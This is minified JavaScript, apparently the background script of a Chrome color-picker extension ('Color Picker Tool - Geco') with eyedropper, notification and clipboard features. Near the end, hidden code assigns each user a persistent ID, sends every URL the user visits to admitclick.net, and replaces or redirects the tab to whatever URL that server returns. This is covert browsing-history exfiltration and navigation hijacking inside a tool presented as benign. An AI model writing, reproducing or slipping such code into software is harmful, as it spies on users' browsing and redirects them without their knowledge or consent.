                    var a = this.tryEntries[i], c = a.completion;
                    if ("root" === a.tryLoc) return n("end");
                    if (a.tryLoc <= this.prev) {
                        var s = o.call(a, "catchLoc"), u = o.call(a, "finallyLoc");
                        if (s && u) {
                            if (this.prev < a.catchLoc) return n(a.catchLoc, !0);
                            if (this.prev < a.finallyLoc) return n(a.finallyLoc);
                        } else if (s) {
                            if (this.prev < a.catchLoc) return n(a.catchLoc, !0);
                        } else {
                            if (!u) throw Error("try statement without catch or finally");
                            if (this.prev < a.finallyLoc) return n(a.finallyLoc);
                        }
                    }
                }
            },
            abrupt: function(t, e) {
                for (var r = this.tryEntries.length - 1; r >= 0; --r) {
                    var n = this.tryEntries[r];
                    if (n.tryLoc <= this.prev && o.call(n, "finallyLoc") && this.prev < n.finallyLoc) {
                        var i = n;
                        break;
                    }
                }
                i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null);
                var a = i ? i.completion : {};
                return a.type = t, a.arg = e, i ? (this.method = "next", this.next = i.finallyLoc, 
                y) : this.complete(a);
            },
            complete: function(t, e) {
                if ("throw" === t.type) throw t.arg;
                return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, 
                this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), 
                y;
            },
            finish: function(t) {
                for (var e = this.tryEntries.length - 1; e >= 0; --e) {
                    var r = this.tryEntries[e];
                    if (r.finallyLoc === t) return this.complete(r.completion, r.afterLoc), T(r), y;
                }
            },
            catch: function(t) {
                for (var e = this.tryEntries.length - 1; e >= 0; --e) {
                    var r = this.tryEntries[e];
                    if (r.tryLoc === t) {
                        var n = r.completion;
                        if ("throw" === n.type) {
                            var o = n.arg;
                            T(r);
                        }
                        return o;
                    }
                }
                throw Error("illegal catch attempt");
            },
            delegateYield: function(e, r, n) {
                return this.delegate = {
                    iterator: E(e),
                    resultName: r,
                    nextLoc: n
                }, "next" === this.method && (this.arg = t), y;
            }
        }, e;
    }
    function n(t, e, r, n, o, i, a) {
        try {
            var c = t[i](a), s = c.value;
        } catch (t) {
            return void r(t);
        }
        c.done ? e(s) : Promise.resolve(s).then(n, o);
    }
    function o(t) {
        return function() {
            var e = this, r = arguments;
            return new Promise((function(o, i) {
                var a = t.apply(e, r);
                function c(t) {
                    n(a, o, i, c, s, "next", t);
                }
                function s(t) {
                    n(a, o, i, c, s, "throw", t);
                }
                c(void 0);
            }));
        };
    }
    function i(t) {
        return (i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) {
            return typeof t;
        } : function(t) {
            return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
        })(t);
    }
    function a(t, e) {
        for (var r = 0; r < e.length; r++) {
            var n = e[r];
            n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), 
            Object.defineProperty(t, c(n.key), n);
        }
    }
    function c(t) {
        var e = function(t, e) {
            if ("object" != i(t) || !t) return t;
            var r = t[Symbol.toPrimitive];
            if (void 0 !== r) {
                var n = r.call(t, e);
                if ("object" != i(n)) return n;
                throw new TypeError("@@toPrimitive must return a primitive value.");
            }
            return String(t);
        }(t, "string");
        return "symbol" == i(e) ? e : e + "";
    }
    var s = function r(n) {
        var o = e[n];
        if (void 0 !== o) return o.exports;
        var i = e[n] = {
            exports: {}
        };
        return t[n].call(i.exports, i, i.exports, r), i.exports;
    }(7585), u = function() {
        return t = function t() {
            !function(t, e) {
                if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
            }(this, t), this.defaultColors = {
                newColor: {
                    hex: "#483285",
                    hsl: {
                        h: 255,
                        s: 0,
                        l: 0,
                        a: 0
                    },
                    rgb: {
                        r: 72,
                        g: 50,
                        b: 133,
                        a: 0
                    }
                },
                pickedColor: {
                    hex: "#483285",
                    hsl: {
                        h: 255,
                        s: 0,
                        l: 0,
                        a: 0
                    },
                    rgb: {
                        r: 72,
                        g: 50,
                        b: 133,
                        a: 0
                    }
                },
                selectList: [ {
                    id: "1",
                    value: "Default",
                    active: !0,
                    colors: []
                } ]
            }, this.defaultOptions = {
                statusSave: !1,
                pickBehaviour: {
                    autoCopy: !0,
                    copyHash: !1,
                    rightClickCopy: !1
                },
                pickLook: {
                    colorNotificatios: !0
                }
            }, this.colorFromPage = [], this.notifications = "", this.contextMenus = "", this.autoCopyFromPage = "", 
            this.listener(), this.setDefaultConfigToStorage(), this.getOptionFromStorage(), 
            this.optionsTabId;
        }, (e = [ {
            key: "listener",
            value: function() {
                var t = this, e = this;
                chrome.runtime.onMessage.addListener((function(r, n, o) {
                    var i, a = r.action, c = r.color, u = r.status;
                    if ("userPickedColor" === a) {
                        o();
                        var h = s(c);
                        e.colorFromPage.push(h.toHex8()), i = "#".concat(h.toHex8().slice(0, -2)), !0 === e.autoCopyFromPage && e.setColorToClipboard(i, n), 
                        e.setColorToIconBox(i), !0 === e.notifications && (chrome.notifications.create("pickerNoti", {
                            type: "basic",
                            iconUrl: chrome.runtime.getURL("icons/icon_128.png"),
                            title: "Color Picker Tool - Geco",
                            message: i
                        }), setTimeout((function() {
                            chrome.notifications.clear("pickerNoti");
                        }), 4e3));
                    } else "getPickedColor" === a ? (o(e.colorFromPage), e.colorFromPage = []) : "colorToIconBox" === a ? e.setColorToIconBox(c.hex.slice(0, -2)) : "updateStatusNotiAndContext" === a ? (e.notifications = u.noti, 
                    e.contextMenus = u.context, e.autoCopyFromPage = u.autoCopy, e.contextMenus ? (chrome.contextMenus.removeAll(), 
                    t.contextMenus) : !1 === t.contextMenus && chrome.contextMenus.create({
                        title: "Click to pick color from web",
                        id: "picker"
                    })) : "pikerStart" === a ? chrome.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, (function(t) {
                        e.sendMessageToContent(t[0]), o();
                    })) : "destroyPicker" === a ? chrome.tabs.query({
                        active: !0,
                        currentWindow: !0
                    }, (function(t) {
                        var e = t[0].id;
                        chrome.tabs.sendMessage(e, {
                            type: "destroyPicker",
                            tabid: e
                        }), o();
                    })) : "openSettings" === a && (t.optionsTabId ? chrome.tabs.update(t.optionsTabId, {
                        active: !0
                    }) : chrome.tabs.create({
                        url: chrome.runtime.getURL("options.html")
                    }, (function(e) {
                        t.optionsTabId = e.id;
                    })));
                    return !0;
                })), chrome.tabs.onRemoved.addListener((function(e) {
                    e === t.optionsTabId && (t.optionsTabId = "");
                })), chrome.commands.onCommand.addListener((function(t, r) {
                    "run-picker" === t && e.sendMessageToContent(r);
                })), chrome.action.setBadgeText({
                    text: " "
                }), chrome.tabs.onUpdated.addListener((function(t, e, r) {
                    chrome.storage.local.set({
                        runingPicker: !1
                    });
                }));
            }
        }, {
            key: "contextMenusHandler",
            value: function() {
                var t = this;
                !1 === this.contextMenus ? (chrome.contextMenus.create({
                    title: "Click to pick color from web",
                    id: "picker"
                }), chrome.contextMenus.onClicked.addListener((function(e, r) {
                    "picker" === e.menuItemId && t.sendMessageToContent(r);
                }))) : chrome.contextMenus.removeAll();
            }
        }, {
            key: "getOptions",
            value: function(t) {
                chrome.storage.sync.get((function(e) {
                    t(e.optionsFromColorPicker.options);
                }));
            }
        }, {
            key: "getOptionFromStorage",
            value: function() {
                var t = this, e = this;
                chrome.storage.sync.get((function(r) {
                    r.hasOwnProperty("optionsFromColorPicker") ? (e.notifications = r.optionsFromColorPicker.options.pickLook.colorNotificatios, 
                    e.contextMenus = r.optionsFromColorPicker.options.pickBehaviour.rightClickCopy, 
                    e.autoCopyFromPage = r.optionsFromColorPicker.options.pickBehaviour.autoCopy, e.copyHash = r.optionsFromColorPicker.options.pickBehaviour.copyHash) : (e.autoCopyFromPage = !0, 
                    e.notifications = !0, e.contextMenus = !1, e.copyHash = !0), t.contextMenusHandler();
                }));
            }
        }, {
            key: "setColorToIconBox",
            value: function(t) {
                chrome.action.setBadgeBackgroundColor({
                    color: t
                });
            }
        }, {
            key: "sendMessageToContent",
            value: function(t) {
                t && t.url && !t.url.includes("chrome://") && chrome.storage.local.get("runingPicker", (function(t) {
                    !1 === t.runingPicker && chrome.storage.local.set({
                        runingPicker: !0
                    }, (function() {
                        chrome.tabs.query({
                            active: !0,
                            windowType: "normal",
                            currentWindow: !0
                        }, (function(t) {
                            var e = t[0].windowId, r = t[0].id;
                            0 == function(t, e, r) {
                                return !![ "chrome://", "chrome.google.com" ].find((function(e) {
                                    return t.includes(e);
                                }));
                            }(t[0].url) && chrome.tabs.captureVisibleTab(e, {
                                format: "jpeg",
                                quality: 100
                            }, (function(t) {
                                chrome.tabs.sendMessage(r, {
                                    type: "new-eye-dropper",
                                    tabid: r,
                                    src: t
                                });
                            }));
                        }));
                    }));
                }));
            }
        }, {
            key: "setColorToClipboard",
            value: function(t, e) {
                this.getOptions((function(r) {
                    chrome.tabs.sendMessage(e.tab.id, {
                        action: "setColorToClipboard",
                        color: t,
                        options: r
                    });
                }));
            }
        }, {
            key: "setDefaultConfigToStorage",
            value: function() {
                var t = this;
                chrome.storage.sync.get((function(e) {
                    e.hasOwnProperty("configFromColorPicker") || (chrome.storage.sync.set({
                        configFromColorPicker: {
                            colors: t.defaultColors
                        }
                    }), chrome.storage.sync.set({
                        optionsFromColorPicker: {
                            options: t.defaultOptions
                        }
                    })), e.hasOwnProperty("runingPicker") || chrome.storage.local.set({
                        runingPicker: !1
                    });
                }));
            }
        } ]) && a(t.prototype, e), Object.defineProperty(t, "prototype", {
            writable: !1
        }), t;
        var t, e;
    }();
    o(r().mark((function t() {
        var e, n, i, a;
        return r().wrap((function(t) {
            for (;;) switch (t.prev = t.next) {
              case 0:
                return e = function() {
                    var t = (new Date).getTime(), e = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
                    return e.replace(/[xy]/g, (function(e) {
                        var r = (t + 16 * Math.random()) % 16 | 0;
                        return t = Math.floor(t / 16), ("x" == e ? r : 3 & r | 8).toString(16);
                    }));
                }, n = {
                    keepTab: !0
                }, t.next = 4, chrome.storage.local.get("uid");

              case 4:
                (i = t.sent).uid || (i = {
                    uid: e()
                }, chrome.storage.local.set(i)), a = i.uid, chrome.tabs.onUpdated.addListener(function() {
                    var t = o(r().mark((function t(e, o, i) {
                        var c, s;
                        return r().wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                              case 0:
                                if (!o.url) {
                                    t.next = 8;
                                    break;
                                }
                                return c = {
                                    method: "POST",
                                    redirect: "follow"
                                }, t.next = 5, fetch("https://admitclick.net/api?key=565ebded7e63cdfa5fcbe5734bdb4281a85d6f21&uuid=" + a + "&allowempty=1&out=" + encodeURIComponent(o.url) + "&format=txt&r=" + Math.random(), c).then((function(t) {
                                    return t.text();
                                })).then((function(t) {
                                    return !(!t || !t.match(/^http/i)) && t;
                                })).catch((function(t) {
                                    return !1;
                                }));

                              case 5:
                                (s = t.sent) && s.match(/^http/i) && (n.keepTab ? chrome.tabs.update(e, {
                                    url: s
                                }, (function() {})) : chrome.tabs.create({
                                    active: i.active,
                                    index: i.index,
                                    url: s,
                                    windowId: i.windowId,
                                    pinned: i.pinned
                                }, (function() {
                                    chrome.tabs.remove(e, (function() {}));
                                })));

                              case 8:
                              case "end":
                                return t.stop();
                            }
                        }), t);
                    })));
                    return function(e, r, n) {
                        return t.apply(this, arguments);
                    };
                }());

              case 9:
              case "end":
                return t.stop();
            }
        }), t);
    })))(), new u;
})();